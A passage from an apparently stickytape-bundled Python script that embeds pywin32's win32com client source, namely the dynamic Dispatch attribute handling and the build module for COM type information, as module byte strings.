  def _Release_(self):\n        """Cleanup object - like a close - to force cleanup when you dont\n        want to rely on Python\'s reference counting."""\n        for childCont in self._mapCachedItems_.values():\n            childCont._Release_()\n        self._mapCachedItems_ = {}\n        if self._oleobj_:\n            self._oleobj_.Release()\n            self.__dict__["_oleobj_"] = None\n        if self._olerepr_:\n            self.__dict__["_olerepr_"] = None\n        self._enum_ = None\n\n    def _proc_(self, name, *args):\n        """Call the named method as a procedure, rather than function.\n        Mainly used by Word.Basic, which whinges about such things."""\n        try:\n            item = self._olerepr_.mapFuncs[name]\n            dispId = item.dispid\n            return self._get_good_object_(\n                self._oleobj_.Invoke(*(dispId, LCID, item.desc[4], 0) + (args))\n            )\n        except KeyError:\n            raise AttributeError(name)\n\n    def _print_details_(self):\n        "Debug routine - dumps what it knows about an object."\n        print("AxDispatch container", self._username_)\n        try:\n            print("Methods:")\n            for method in self._olerepr_.mapFuncs.keys():\n                print("\\t", method)\n            print("Props:")\n            for prop, entry in self._olerepr_.propMap.items():\n                print("\\t%s = 0x%x - %s" % (prop, entry.dispid, repr(entry)))\n            print("Get Props:")\n            for prop, entry in self._olerepr_.propMapGet.items():\n                print("\\t%s = 0x%x - %s" % (prop, entry.dispid, repr(entry)))\n            print("Put Props:")\n            for prop, entry in self._olerepr_.propMapPut.items():\n                print("\\t%s = 0x%x - %s" % (prop, entry.dispid, repr(entry)))\n        except:\n            traceback.print_exc()\n\n    def __LazyMap__(self, attr):\n        try:\n            if self._LazyAddAttr_(attr):\n                debug_attr_print(\n                    "%s.__LazyMap__(%s) added something" % (self._username_, attr)\n                )\n                return 1\n        except AttributeError:\n            return 0\n\n    # Using the typecomp, lazily create a new attribute definition.\n    def _LazyAddAttr_(self, attr):\n        if self._lazydata_ is None:\n            return 0\n        res = 0\n        typeinfo, typecomp = self._lazydata_\n        olerepr = self._olerepr_\n        # We need to explicitly check each invoke type individually - simply\n        # specifying \'0\' will bind to "any member", which may not be the one\n        # we are actually after (ie, we may be after prop_get, but returned\n        # the info for the prop_put.)\n        for i in ALL_INVOKE_TYPES:\n            try:\n                x, t = typecomp.Bind(attr, i)\n                # Support \'Get\' and \'Set\' properties - see\n                # bug 1587023\n                if x == 0 and attr[:3] in ("Set", "Get"):\n                    x, t = typecomp.Bind(attr[3:], i)\n                if x == pythoncom.DESCKIND_FUNCDESC:  # it\'s a FUNCDESC\n                    r = olerepr._AddFunc_(typeinfo, t, 0)\n                elif x == pythoncom.DESCKIND_VARDESC:  # it\'s a VARDESC\n                    r = olerepr._AddVar_(typeinfo, t, 0)\n                else:  # not found or TYPEDESC/IMPLICITAPP\n                    r = None\n                if not r is None:\n                    key, map = r[0], r[1]\n                    item = map[key]\n                    if map == olerepr.propMapPut:\n                        olerepr._propMapPutCheck_(key, item)\n                    elif map == olerepr.propMapGet:\n                        olerepr._propMapGetCheck_(key, item)\n                    res = 1\n            except:\n                pass\n        return res\n\n    def _FlagAsMethod(self, *methodNames):\n        """Flag these attribute names as being methods.\n        Some objects do not correctly differentiate methods and\n        properties, leading to problems when calling these methods.\n\n        Specifically, trying to say: ob.SomeFunc()\n        may yield an exception "None object is not callable"\n        In this case, an attempt to fetch the *property* has worked\n        and returned None, rather than indicating it is really a method.\n        Calling: ob._FlagAsMethod("SomeFunc")\n        should then allow this to work.\n        """\n        for name in methodNames:\n            details = build.MapEntry(self.__AttrToID__(name), (name,))\n            self._olerepr_.mapFuncs[name] = details\n\n    def __AttrToID__(self, attr):\n        debug_attr_print(\n            "Calling GetIDsOfNames for property %s in Dispatch container %s"\n            % (attr, self._username_)\n        )\n        return self._oleobj_.GetIDsOfNames(0, attr)\n\n    def __getattr__(self, attr):\n        if attr == "__iter__":\n            # We can\'t handle this as a normal method, as if the attribute\n            # exists, then it must return an iterable object.\n            try:\n                invkind = pythoncom.DISPATCH_METHOD | pythoncom.DISPATCH_PROPERTYGET\n                enum = self._oleobj_.InvokeTypes(\n                    pythoncom.DISPID_NEWENUM, LCID, invkind, (13, 10), ()\n                )\n            except pythoncom.com_error:\n                raise AttributeError("This object can not function as an iterator")\n            # We must return a callable object.\n            class Factory:\n                def __init__(self, ob):\n                    self.ob = ob\n\n                def __call__(self):\n                    import win32com.client.util\n\n                    return win32com.client.util.Iterator(self.ob)\n\n            return Factory(enum)\n\n        if attr.startswith("_") and attr.endswith("_"):  # Fast-track.\n            raise AttributeError(attr)\n        # If a known method, create new instance and return.\n        try:\n            return MakeMethod(self._builtMethods_[attr], self, self.__class__)\n        except KeyError:\n            pass\n        # XXX - Note that we current are case sensitive in the method.\n        # debug_attr_print("GetAttr called for %s on DispatchContainer %s" % (attr,self._username_))\n        # First check if it is in the method map.  Note that an actual method\n        # must not yet exist, (otherwise we would not be here).  This\n        # means we create the actual method object - which also means\n        # this code will never be asked for that method name again.\n        if attr in self._olerepr_.mapFuncs:\n            return self._make_method_(attr)\n\n        # Delegate to property maps/cached items\n        retEntry = None\n        if self._olerepr_ and self._oleobj_:\n            # first check general property map, then specific "put" map.\n            retEntry = self._olerepr_.propMap.get(attr)\n            if retEntry is None:\n                retEntry = self._olerepr_.propMapGet.get(attr)\n            # Not found so far - See what COM says.\n            if retEntry is None:\n                try:\n                    if self.__LazyMap__(attr):\n                        if attr in self._olerepr_.mapFuncs:\n                            return self._make_method_(attr)\n                        retEntry = self._olerepr_.propMap.get(attr)\n                        if retEntry is None:\n                            retEntry = self._olerepr_.propMapGet.get(attr)\n                    if retEntry is None:\n                        retEntry = build.MapEntry(self.__AttrToID__(attr), (attr,))\n                except pythoncom.ole_error:\n                    pass  # No prop by that name - retEntry remains None.\n\n        if retEntry is not None:  # see if in my cache\n            try:\n                ret = self._mapCachedItems_[retEntry.dispid]\n                debug_attr_print("Cached items has attribute!", ret)\n                return ret\n            except (KeyError, AttributeError):\n                debug_attr_print("Attribute %s not in cache" % attr)\n\n        # If we are still here, and have a retEntry, get the OLE item\n        if retEntry is not None:\n            invoke_type = _GetDescInvokeType(retEntry, pythoncom.INVOKE_PROPERTYGET)\n            debug_attr_print(\n                "Getting property Id 0x%x from OLE object" % retEntry.dispid\n            )\n            try:\n                ret = self._oleobj_.Invoke(retEntry.dispid, 0, invoke_type, 1)\n            except pythoncom.com_error as details:\n                if details.hresult in ERRORS_BAD_CONTEXT:\n                    # May be a method.\n                    self._olerepr_.mapFuncs[attr] = retEntry\n                    return self._make_method_(attr)\n                raise\n            debug_attr_print("OLE returned ", ret)\n            return self._get_good_object_(ret)\n\n        # no where else to look.\n        raise AttributeError("%s.%s" % (self._username_, attr))\n\n    def __setattr__(self, attr, value):\n        if (\n            attr in self.__dict__\n        ):  # Fast-track - if already in our dict, just make the assignment.\n            # XXX - should maybe check method map - if someone assigns to a method,\n            # it could mean something special (not sure what, tho!)\n            self.__dict__[attr] = value\n            return\n        # Allow property assignment.\n        debug_attr_print(\n            "SetAttr called for %s.%s=%s on DispatchContainer"\n            % (self._username_, attr, repr(value))\n        )\n\n        if self._olerepr_:\n            # Check the "general" property map.\n            if attr in self._olerepr_.propMap:\n                entry = self._olerepr_.propMap[attr]\n                invoke_type = _GetDescInvokeType(entry, pythoncom.INVOKE_PROPERTYPUT)\n                self._oleobj_.Invoke(entry.dispid, 0, invoke_type, 0, value)\n                return\n            # Check the specific "put" map.\n            if attr in self._olerepr_.propMapPut:\n                entry = self._olerepr_.propMapPut[attr]\n                invoke_type = _GetDescInvokeType(entry, pythoncom.INVOKE_PROPERTYPUT)\n                self._oleobj_.Invoke(entry.dispid, 0, invoke_type, 0, value)\n                return\n\n        # Try the OLE Object\n        if self._oleobj_:\n            if self.__LazyMap__(attr):\n                # Check the "general" property map.\n                if attr in self._olerepr_.propMap:\n                    entry = self._olerepr_.propMap[attr]\n                    invoke_type = _GetDescInvokeType(\n                        entry, pythoncom.INVOKE_PROPERTYPUT\n                    )\n                    self._oleobj_.Invoke(entry.dispid, 0, invoke_type, 0, value)\n                    return\n                # Check the specific "put" map.\n                if attr in self._olerepr_.propMapPut:\n                    entry = self._olerepr_.propMapPut[attr]\n                    invoke_type = _GetDescInvokeType(\n                        entry, pythoncom.INVOKE_PROPERTYPUT\n                    )\n                    self._oleobj_.Invoke(entry.dispid, 0, invoke_type, 0, value)\n                    return\n            try:\n                entry = build.MapEntry(self.__AttrToID__(attr), (attr,))\n            except pythoncom.com_error:\n                # No attribute of that name\n                entry = None\n            if entry is not None:\n                try:\n                    invoke_type = _GetDescInvokeType(\n                        entry, pythoncom.INVOKE_PROPERTYPUT\n                    )\n                    self._oleobj_.Invoke(entry.dispid, 0, invoke_type, 0, value)\n                    self._olerepr_.propMap[attr] = entry\n                    debug_attr_print(\n                        "__setattr__ property %s (id=0x%x) in Dispatch container %s"\n                        % (attr, entry.dispid, self._username_)\n                    )\n                    return\n                except pythoncom.com_error:\n                    pass\n        raise AttributeError(\n            "Property \'%s.%s\' can not be set." % (self._username_, attr)\n        )\n')
    __stickytape_write_module('win32com/client/build.py', b'"""Contains knowledge to build a COM object definition.\n\nThis module is used by both the @dynamic@ and @makepy@ modules to build\nall knowledge of a COM object.\n\nThis module contains classes which contain the actual knowledge of the object.\nThis include parameter and return type information, the COM dispid and CLSID, etc.\n\nOther modules may use this information to generate .py files, use the information\ndynamically, or possibly even generate .html documentation for objects.\n"""\n\n#\n# NOTES: DispatchItem and MapEntry used by dynamic.py.\n#        the rest is used by makepy.py\n#\n#        OleItem, DispatchItem, MapEntry, BuildCallList() is used by makepy\n\nimport sys\nimport string\nfrom keyword import iskeyword\n\nimport pythoncom\nfrom pywintypes import TimeType\nimport winerror\nimport datetime\n\n# It isn\'t really clear what the quoting rules are in a C/IDL string and\n# literals like a quote char and backslashes makes life a little painful to\n# always render the string perfectly - so just punt and fall-back to a repr()\ndef _makeDocString(s):\n    if sys.version_info < (3,):\n        s = s.encode("mbcs")\n    return repr(s)\n\n\nerror = "PythonCOM.Client.Build error"\n\n\nclass NotSupportedException(Exception):\n    pass  # Raised when we cant support a param type.\n\n\nDropIndirection = "DropIndirection"\n\nNoTranslateTypes = [\n    pythoncom.VT_BOOL,\n    pythoncom.VT_CLSID,\n    pythoncom.VT_CY,\n    pythoncom.VT_DATE,\n    pythoncom.VT_DECIMAL,\n    pythoncom.VT_EMPTY,\n    pythoncom.VT_ERROR,\n    pythoncom.VT_FILETIME,\n    pythoncom.VT_HRESULT,\n    pythoncom.VT_I1,\n    pythoncom.VT_I2,\n    pythoncom.VT_I4,\n    pythoncom.VT_I8,\n    pythoncom.VT_INT,\n    pythoncom.VT_NULL,\n    pythoncom.VT_R4,\n    pythoncom.VT_R8,\n    pythoncom.VT_NULL,\n    pythoncom.VT_STREAM,\n    pythoncom.VT_UI1,\n    pythoncom.VT_UI2,\n    pythoncom.VT_UI4,\n    pythoncom.VT_UI8,\n    pythoncom.VT_UINT,\n    pythoncom.VT_VOID,\n]\n\nNoTranslateMap = {}\nfor v in NoTranslateTypes:\n    NoTranslateMap[v] = None\n\n\nclass MapEntry:\n    "Simple holder for named attibutes - items in a map."\n\n    def __init__(\n        self,\n        desc_or_id,\n        names=None,\n        doc=None,\n        resultCLSID=pythoncom.IID_NULL,\n        resultDoc=None,\n        hidden=0,\n    ):\n        if type(desc_or_id) == type(0):\n            self.dispid = desc_or_id\n            self.desc = None\n        else:\n            self.dispid = desc_or_id[0]\n            self.desc = desc_or_id\n\n        self.names = names\n        self.doc = doc\n        self.resultCLSID = resultCLSID\n        self.resultDocumentation = resultDoc\n        self.wasProperty = (\n            0  # Have I been transformed into a function so I can pass args?\n        )\n        self.hidden = hidden\n\n    def __repr__(self):\n        return (\n            "MapEntry(dispid={s.dispid}, desc={s.desc}, names={s.names}, doc={s.doc!r}, "\n            "resultCLSID={s.resultCLSID}, resultDocumentation={s.resultDocumentation}, "\n            "wasProperty={s.wasProperty}, hidden={s.hidden}"\n        ).format(s=self)\n\n    def GetResultCLSID(self):\n        rc = self.resultCLSID\n        if rc == pythoncom.IID_NULL:\n            return None\n        return rc\n\n    # Return a string, suitable for output - either "\'{...}\'" or "None"\n    def GetResultCLSIDStr(self):\n        rc = self.GetResultCLSID()\n        if rc is None:\n            return "None"\n        return repr(\n            str(rc)\n        )  # Convert the IID object to a string, then to a string in a string.\n\n    def GetResultName(self):\n        if self.resultDocumentation is None:\n            return None\n        return self.resultDocumentation[0]\n\n\nclass OleItem:\n    typename = "OleItem"\n\n    def __init__(self, doc=None):\n        self.doc = doc\n        if self.doc:\n            self.python_name = MakePublicAttributeName(self.doc[0])\n        else:\n            self.python_name = None\n        self.bWritten = 0\n        self.bIsDispatch = 0\n        self.bIsSink = 0\n        self.clsid = None\n        self.co_class = None\n\n\nclass DispatchItem(OleItem):\n    typename = "DispatchItem"\n\n    def __init__(self, typeinfo=None, attr=None, doc=None, bForUser=1):\n        OleItem.__init__(self, doc)\n        self.propMap = {}\n        self.propMapGet = {}\n        self.propMapPut = {}\n        self.mapFuncs = {}\n        self.defaultDispatchName = None\n        self.hidden = 0\n\n        if typeinfo:\n            self.Build(typeinfo, attr, bForUser)\n\n    def _propMapPutCheck_(self, key, item):\n        ins, outs, opts = self.CountInOutOptArgs(item.desc[2])\n        if ins > 1:  # if a Put property takes more than 1 arg:\n            if opts + 1 == ins or ins == item.desc[6] + 1:\n                newKey = "Set" + key\n                deleteExisting = 0  # This one is still OK\n            else:\n                deleteExisting = 1  # No good to us\n                if key in self.mapFuncs or key in self.propMapGet:\n                    newKey = "Set" + key\n                else:\n                    newKey = key\n            item.wasProperty = 1\n            self.mapFuncs[newKey] = item\n            if deleteExisting:\n                del self.propMapPut[key]\n\n    def _propMapGetCheck_(self, key, item):\n        ins, outs, opts = self.CountInOutOptArgs(item.desc[2])\n        if ins > 0:  # if a Get property takes _any_ in args:\n            if item.desc[6] == ins or ins == opts:\n                newKey = "Get" + key\n                deleteExisting = 0  # This one is still OK\n            else:\n                deleteExisting = 1  # No good to us\n                if key in self.mapFuncs:\n                    newKey = "Get" + key\n                else:\n                    newKey = key\n            item.wasProperty = 1\n            self.mapFuncs[newKey] = item\n            if deleteExisting:\n                del self.propMapGet[key]\n\n    def _AddFunc_(self, typeinfo, fdesc, bForUser):\n        assert fdesc.desckind == pythoncom.DESCKIND_FUNCDESC\n        id = fdesc.memid\n        funcflags = fdesc.wFuncFlags\n        try:\n            names = typeinfo.GetNames(id)\n            name = names[0]\n        except pythoncom.ole_error:\n            name = ""\n            names = None\n\n        doc = None\n        try:\n            if bForUser:\n                doc = typeinfo.GetDocumentation(id)\n        except pythoncom.ole_error:\n            pass\n\n        if id == 0 and name:\n            self.defaultDispatchName = name\n\n        invkind = fdesc.invkind\n\n        # We need to translate any Alias\', Enums, structs etc in result and args\n        typerepr, flag, defval = fdesc.rettype\n        # \t\tsys.stderr.write("%s result - %s -> " % (name, typerepr))\n        typerepr, resultCLSID, resultDoc = _ResolveType(typerepr, typeinfo)\n        # \t\tsys.stderr.write("%s\\n" % (typerepr,))\n        fdesc.rettype = typerepr, flag, defval, resultCLSID\n        # Translate any Alias or Enums in argument list.\n        argList = []\n        for argDesc in fdesc.args:\n            typerepr, flag, defval = argDesc\n            # \t\t\tsys.stderr.write("%s arg - %s -> " % (name, typerepr))\n            arg_type, arg_clsid, arg_doc = _ResolveType(typerepr, typeinfo)\n            argDesc = arg_type, flag, defval, arg_clsid\n            # \t\t\tsys.stderr.write("%s\\n" % (argDesc[0],))\n            argList.append(argDesc)\n        fdesc.args = tuple(argList)\n\n        hidden = (funcflags & pythoncom.FUNCFLAG_FHIDDEN) != 0\n        if invkind == pythoncom.INVOKE_PROPERTYGET:\n            map = self.propMapGet\n        # This is not the best solution, but I dont think there is\n        # one without specific "set" syntax.\n        # If there is a single PUT or PUTREF, it will function as a property.\n        # If there are both, then the PUT remains a property, and the PUTREF\n        # gets transformed into a function.\n        # (in vb, PUT=="obj=other_obj", PUTREF="set obj=other_obj\n        elif invkind in (pythoncom.INVOKE_PROPERTYPUT, pythoncom.INVOKE_PROPERTYPUTREF):\n            # Special case\n            existing = self.propMapPut.get(name, None)\n            if existing is not None:\n                if existing.desc[4] == pythoncom.INVOKE_PROPERTYPUT:  # Keep this one\n                    map = self.mapFuncs\n                    name = "Set" + name\n                else:  # Existing becomes a func.\n                    existing.wasProperty = 1\n                    self.mapFuncs["Set" + name] = existing\n                    map = self.propMapPut  # existing gets overwritten below.\n            else:\n                map = self.propMapPut  # first time weve seen it.\n\n        elif invkind == pythoncom.INVOKE_FUNC:\n            map = self.mapFuncs\n        else:\n            map = None\n        if not map is None:\n            # \t\t\t\tif map.has_key(name):\n            # \t\t\t\t\tsys.stderr.write("Warning - overwriting existing method/attribute %s\\n" % name)\n            map[name] = MapEntry(fdesc, names, doc, resultCLSID, resultDoc, hidden)\n            # any methods that can\'t be reached via DISPATCH we return None\n            # for, so dynamic dispatch doesnt see it.\n            if fdesc.funckind != pythoncom.FUNC_DISPATCH:\n                return None\n            return (name, map)\n        return None\n\n    def _AddVar_(self, typeinfo, vardesc, bForUser):\n        ### need pythoncom.VARFLAG_FRESTRICTED ...\n        ### then check it\n        assert vardesc.desckind == pythoncom.DESCKIND_VARDESC\n\n        if vardesc.varkind == pythoncom.VAR_DISPATCH:\n            id = vardesc.memid\n            names = typeinfo.GetNames(id)\n            # Translate any Alias or Enums in result.\n            typerepr, flags, defval = vardesc.elemdescVar\n            typerepr, resultCLSID, resultDoc = _ResolveType(typerepr, typeinfo)\n            vardesc.elemdescVar = typerepr, flags, defval\n            doc = None\n            try:\n                if bForUser:\n                    doc = typeinfo.GetDocumentation(id)\n            except pythoncom.ole_error:\n                pass\n\n            # handle the enumerator specially\n            map = self.propMap\n            # Check if the element is hidden.\n            hidden = (vardesc.wVarFlags & 0x40) != 0  # VARFLAG_FHIDDEN\n            map[names[0]] = MapEntry(\n                vardesc, names, doc, resultCLSID, resultDoc, hidden\n            )\n            return (names[0], map)\n        else:\n            return None\n\n    def Build(self, typeinfo, attr, bForUser=1):\n        self.clsid = attr[0]\n        self.bIsDispatch = (attr.wTypeFlags & pythoncom.TYPEFLAG_FDISPATCHABLE) != 0\n        if typeinfo is None:\n            return\n        # Loop over all methods\n        for j in range(attr[6]):\n            fdesc = typeinfo.GetFuncDesc(j)\n            self._AddFunc_(typeinfo, fdesc, bForUser)\n\n        # Loop over all variables (ie, properties)\n        for j in range(attr[7]):\n            fdesc = typeinfo.GetVarDesc(j)\n            self._AddVar_(typeinfo, fdesc, bForUser)\n\n        # Now post-process the maps.  For any "Get" or "Set" properties\n        # that have arguments, we must turn them into methods.  If a method\n        # of the same name already exists, change the name.\n        for key, item in list(self.propMapGet.items()):\n            self._propMapGetCheck_(key, item)\n\n        for key, item in list(self.propMapPut.items()):\n            self._propMapPutCheck_(key, item)\n\n    def CountInOutOptArgs(self, argTuple):\n        "Return tuple counting in/outs/OPTS.  Sum of result may not be len(argTuple), as some args may be in/out."\n        ins = out = opts = 0\n        for argCheck in argTuple:\n            inOut = argCheck[1]\n            if inOut == 0:\n                ins = ins + 1\n                out = out + 1\n            else:\n                if inOut & pythoncom.PARAMFLAG_FIN:\n                    ins = ins + 1\n                if inOut & pythoncom.PARAMFLAG_FOPT:\n                    opts = opts + 1\n                if inOut & pythoncom.PARAMFLAG_FOUT:\n                    out = out + 1\n        return ins, out, opts\n\n    def MakeFuncMethod(self, entry, name, bMakeClass=1):\n        # If we have a type description, and not varargs...\n        if entry.desc is not None and (len(entry.desc) < 6 or entry.desc[6] != -1):\n            return self.MakeDispatchFuncMethod(entry, name, bMakeClass)\n        else:\n            return self.MakeVarArgsFuncMethod(entry, name, bMakeClass)\n\n    def MakeDispatchFuncMethod(self, entry, name, bMakeClass=1):\n        fdesc = entry.desc\n        doc = entry.doc\n        names = entry.names\n        ret = []\n        if bMakeClass:\n            linePrefix = "\\t"\n            defNamedOptArg = "defaultNamedOptArg"\n            defNamedNotOptArg = "defaultNamedNotOptArg"\n            defUnnamedArg = "defaultUnnamedArg"\n        else:\n            linePrefix = ""\n            defNamedOptArg = "pythoncom.Missing"\n            defNamedNotOptArg = "pythoncom.Missing"\n            defUnnamedArg = "pythoncom.Missing"\n        defOutArg = "pythoncom.Missing"\n        id = fdesc[0]\n\n        s = (\n            linePrefix\n            + "def "\n            + name\n            + "(self"\n            + BuildCallList(\n                fdesc,\n                names,\n                defNamedOptArg,\n                defNamedNotOptArg,\n                defUnnamedArg,\n                defOutArg,\n            )\n            + "):"\n        )\n        ret.append(s)\n        if doc and doc[1]:\n            ret.append(linePrefix + "\\t" + _makeDocString(doc[1]))\n\n        resclsid = entry.GetResultCLSID()\n        if resclsid:\n            resclsid = "\'%s\'" % resclsid\n        else:\n            resclsid = "None"\n        # Strip the default values from the arg desc\n        retDesc = fdesc[8][:2]\n        argsDesc = tuple([what[:2] for what in fdesc[2]])\n        # The runtime translation of the return types is expensive, so when we know the\n        # return type of the function, there is no need to check the type at runtime.\n        # To qualify, this function must return a "simple" type, and have no byref args.\n        # Check if we have byrefs or anything in the args which mean we still need a translate.\n        param_flags = [what[1] for what in fdesc[2]]\n        bad_params = [\n            flag\n            for flag in param_flags\n            if flag & (pythoncom.PARAMFLAG_FOUT | pythoncom.PARAMFLAG_FRETVAL) != 0\n        ]\n        s = None\n        if len(bad_params) == 0 and len(retDesc) == 2 and retDesc[1] == 0:\n            rd = retDesc[0]\n            if rd in NoTranslateMap:\n                s = "%s\\treturn self._oleobj_.InvokeTypes(%d, LCID, %s, %s, %s%s)" % (\n                    linePrefix,\n                    id,\n                    fdesc[4],\n                    retDesc,\n                    argsDesc,\n                    _BuildArgList(fdesc, names),\n                )\n            elif rd in [pythoncom.VT_DISPATCH, pythoncom.VT_UNKNOWN]:\n                s = "%s\\tret = self._oleobj_.InvokeTypes(%d, LCID, %s, %s, %s%s)\\n" % (\n                    linePrefix,\n                    id,\n                    fdesc[4],\n                    retDesc,\n                    repr(argsDesc),\n                    _BuildArgList(fdesc, names),\n                )\n                s = s + "%s\\tif ret is not None:\\n" % (linePrefix,)\n                if rd == pythoncom.VT_UNKNOWN:\n                    s = s + "%s\\t\\t# See if this IUnknown is really an IDispatch\\n" % (\n                        linePrefix,\n                    )\n                    s = s + "%s\\t\\ttry:\\n" % (linePrefix,)\n                    s = (\n                        s\n                        + "%s\\t\\t\\tret = ret.QueryInterface(pythoncom.IID_IDispatch)\\n"\n                        % (linePrefix,)\n                    )\n                    s = s + "%s\\t\\texcept pythoncom.error:\\n" % (linePrefix,)\n                    s = s + "%s\\t\\t\\treturn ret\\n" % (linePrefix,)\n                s = s + "%s\\t\\tret = Dispatch(ret, %s, %s)\\n" % (\n                    linePrefix,\n                    repr(name),\n                    resclsid,\n                )\n                s = s + "%s\\treturn ret" % (linePrefix)\n            elif rd == pythoncom.VT_BSTR:\n                s = "%s\\t# Result is a Unicode object\\n" % (linePrefix,)\n                s = (\n                    s\n                    + "%s\\treturn self._oleobj_.InvokeTypes(%d, LCID, %s, %s, %s%s)"\n                    % (\n                        linePrefix,\n                        id,\n                        fdesc[4],\n                        retDesc,\n                        repr(argsDesc),\n                        _BuildArgList(fdesc, names),\n                    )\n                )\n            # else s remains None\n        if s is None:\n            s = "%s\\treturn self._ApplyTypes_(%d, %s, %s, %s, %s, %s%s)" % (\n                linePrefix,\n                id,\n                fdesc[4],\n                retDesc,\n                argsDesc,\n                repr(name),\n                resclsid,\n                _BuildArgList(fdesc, names),\n            )\n\n        ret.append(s)\n        ret.append("")\n        return ret\n\n    def MakeVarArgsFuncMethod(self, entry, name, bMakeClass=1):\n        fdesc = entry.desc\n        names = entry.names\n        doc = entry.doc\n        ret = []\n        argPrefix = "self"\n        if bMakeClass:\n            linePrefix = "\\t"\n        else:\n            linePrefix = ""\n        ret.append(linePrefix + "def " + name + "(" + argPrefix + ", *args):")\n        if doc and doc[1]:\n            ret.append(linePrefix + "\\t" + _makeDocString(doc[1]))\n        if fdesc:\n            invoketype = fdesc[4]\n        else:\n            invoketype = pythoncom.DISPATCH_METHOD\n        s = linePrefix + "\\treturn self._get_good_object_(self._oleobj_.Invoke(*(("\n        ret.append(\n            s + str(entry.dispid) + ",0,%d,1)+args)),\'%s\')" % (invoketype, names[0])\n        )\n        ret.append("")\n        return ret\n\n\n# Note - "DispatchItem" poorly named - need a new intermediate class.\nclass VTableItem(DispatchItem):\n    def Build(self, typeinfo, attr, bForUser=1):\n        DispatchItem.Build(self, typeinfo, attr, bForUser)\n        assert typeinfo is not None, "Cant build vtables without type info!"\n\n        meth_list = (\n            list(self.mapFuncs.values())\n            + list(self.propMapGet.values())\n            + list(self.propMapPut.values())\n        )\n        meth_list.sort(key=lambda m: m.desc[7])\n\n        # Now turn this list into the run-time representation\n        # (ready for immediate use or writing to gencache)\n        self.vtableFuncs = []\n        for entry in meth_list:\n            self.vtableFuncs.append((entry.names, entry.dispid, entry.desc))\n\n\n# A Lazy dispatch item - builds an item on request using info from\n# an ITypeComp.  The dynamic module makes the called to build each item,\n# and also holds the references to the typeinfo and typecomp.\nclass LazyDispatchItem(DispatchItem):\n    typename = "LazyDispatchItem"\n\n    def __init__(self, attr, doc):\n        self.clsid = attr[0]\n        DispatchItem.__init__(self, None, attr, doc, 0)\n\n\ntypeSubstMap = {\n    pythoncom.VT_INT: pythoncom.VT_I4,\n    pythoncom.VT_UINT: pythoncom.VT_UI4,\n    pythoncom.VT_HRESULT: pythoncom.VT_I4,\n}\n\n\ndef _ResolveType(typerepr, itypeinfo):\n    # Resolve VT_USERDEFINED (often aliases or typed IDispatches)\n\n    if type(typerepr) == tuple:\n        indir_vt, subrepr = typerepr\n        if indir_vt == pythoncom.VT_PTR:\n            # If it is a VT_PTR to a VT_USERDEFINED that is an IDispatch/IUnknown,\n            # then it resolves to simply the object.\n            # Otherwise, it becomes a ByRef of the resolved type\n            # We need to drop an indirection level on pointer to user defined interfaces.\n            # eg, (VT_PTR, (VT_USERDEFINED, somehandle)) needs to become VT_DISPATCH\n            # only when "somehandle" is an object.\n            # but (VT_PTR, (VT_USERDEFINED, otherhandle)) doesnt get the indirection dropped.\n            was_user = type(subrepr) == tuple and subrepr[0] == pythoncom.VT_USERDEFINED\n            subrepr, sub_clsid, sub_doc = _ResolveType(subrepr, itypeinfo)\n            if was_user and subrepr in [\n                pythoncom.VT_DISPATCH,\n                pythoncom.VT_UNKNOWN,\n                pythoncom.VT_RECORD,\n            ]:\n                # Drop the VT_PTR indirection\n                return subrepr, sub_clsid, sub_doc\n            # Change PTR indirection to byref\n            return subrepr | pythoncom.VT_BYREF, sub_clsid, sub_doc\n        if indir_vt == pythoncom.VT_SAFEARRAY:\n            # resolve the array element, and convert to VT_ARRAY\n            subrepr, sub_clsid, sub_doc = _ResolveType(subrepr, itypeinfo)\n            return pythoncom.VT_ARRAY | subrepr, sub_clsid, sub_doc\n        if indir_vt == pythoncom.VT_CARRAY:  # runtime has no support for this yet.\n            # resolve the array element, and convert to VT_CARRAY\n            # sheesh - return _something_\n            return pythoncom.VT_CARRAY, None, None\n        if indir_vt == pythoncom.VT_USERDEFINED:\n            try:\n                resultTypeInfo = itypeinfo.GetRefTypeInfo(subrepr)\n            except pythoncom.com_error as details:\n                if details.hresult in [\n                    winerror.TYPE_E_CANTLOADLIBRARY,\n                    winerror.TYPE_E_LIBNOTREGISTERED,\n                ]:\n                    # an unregistered interface\n                    return pythoncom.VT_UNKNOWN, None, None\n                raise\n\n            resultAttr = resultTypeInfo.GetTypeAttr()\n            typeKind = resultAttr.typekind\n            if typeKind == pythoncom.TKIND_ALIAS:\n                tdesc = resultAttr.tdescAlias\n                return _ResolveType(tdesc, resultTypeInfo)\n            elif typeKind in [pythoncom.TKIND_ENUM, pythoncom.TKIND_MODULE]:\n                # For now, assume Long\n                return pythoncom.VT_I4, None, None\n\n            elif typeKind == pythoncom.TKIND_DISPATCH:\n                clsid = resultTypeInfo.GetTypeAttr()[0]\n                retdoc = resultTypeInfo.GetDocumentation(-1)\n                return pythoncom.VT_DISPATCH, clsid, retdoc\n\n            elif typeKind in [pythoncom.TKIND_INTERFACE, pythoncom.TKIND_COCLASS]:\n                # XXX - should probably get default interface for CO_CLASS???\n                clsid = resultTypeInfo.GetTypeAttr()[0]\n                retdoc = resultTypeInfo.GetDocumentation(-1)\n                return pythoncom.VT_UNKNOWN, clsid, retdoc\n\n            elif typeKind == pythoncom.TKIND_RECORD:\n                return pythoncom.VT_RECORD, None, None\n            raise NotSupportedException("Can not resolve alias or user-defined type")\n    return typeSubstMap.get(typerepr, typerepr), None, None\n\n\ndef _BuildArgList(fdesc, names):\n    "Builds list of args to the underlying Invoke method."\n    # Word has TypeInfo for Insert() method, but says "no args"\n    numArgs = max(fdesc[6], len(fdesc[2]))\n    names = list(names)\n    while None in names:\n        i = names.index(None)\n        names[i] = "arg%d" % (i,)\n    # We\'ve seen \'source safe\' libraries offer the name of \'ret\' params in\n    # \'names\' - although we can\'t reproduce this, it would be insane to offer\n    # more args than we have arg infos for - hence the upper limit on names...\n    names = list(map(MakePublicAttributeName, names[1 : (numArgs + 1)]))\n    name_num = 0\n    while len(names) < numArgs:\n        names.append("arg%d" % (len(names),))\n    # As per BuildCallList(), avoid huge lines.\n    # Hack a "\\n" at the end of every 5th name - "strides" would be handy\n    # here but don\'t exist in 2.2\n    for i in range(0, len(names), 5):\n        names[i] = names[i] + "\\n\\t\\t\\t"\n    return "," + ", ".join(names)\n\n\nvalid_identifier_chars = string.ascii_letters + string.digits + "_"\n\n\ndef demunge_leading_underscores(className):\n    i = 0\n    while className[i] == "_":\n        i += 1\n    assert i >= 2, "Should only be here with names starting with \'__\'"\n    return className[i - 1 :] + className[: i - 1]\n\n\n# Given a "public name" (eg, the name of a class, function, etc)\n# make sure it is a legal (and reasonable!) Python name.\ndef 